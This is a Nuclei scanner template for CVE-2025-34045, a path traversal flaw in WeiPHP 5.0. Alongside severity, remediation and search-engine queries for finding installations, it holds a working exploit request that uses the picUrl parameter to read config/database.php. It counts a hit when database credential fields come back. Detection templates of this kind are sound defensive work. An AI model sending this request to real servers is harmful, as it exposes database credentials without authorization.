id: CVE-2025-34045

info:
  name: WeiPHP 5.0 - Path Traversal
  author: neha
  severity: high
  description: |
    WeiPHP 5.0 contains a path traversal vulnerability caused by insufficient input validation of the picUrl parameter in /public/index.php/material/Material/_download_imgage, letting unauthenticated remote attackers read arbitrary files.
  impact: |
    Successful exploitation allows unauthenticated remote attackers to read arbitrary files from the server filesystem, potentially exposing sensitive configuration files, database credentials, or other critical system information.
  remediation: |
    Apply input validation and sanitization to the picUrl parameter. Implement proper path traversal protection by resolving and validating file paths before access. Upgrade to a patched version of WeiPHP if available.
  reference:
    - https://vulncheck.com/advisories/weiphp-path-traversal-file-read
    - https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cnvd/2020/CNVD-2020-68596.yaml
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2025-34045
    cwe-id: CWE-22
  metadata:
    verified: true
    max-request: 1
    vendor: weiphp
    product: weiphp
    shodan-query: http.html:"weiphp"
    fofa-query: body="weiphp"
  tags: cve,cve2025,weiphp,lfi,path-traversal,vuln,kev

http:
  - method: POST
    path:
      - "{{BaseURL}}/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php"

    body: "1=1"

    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "DB_HOST"
          - "DB_NAME"
          - "DB_USER"
        condition: or

      - type: word
        part: body
        words:
          - "weiphp"
          - "WeiPHP"
        condition: or

      - type: status
        status:
          - 200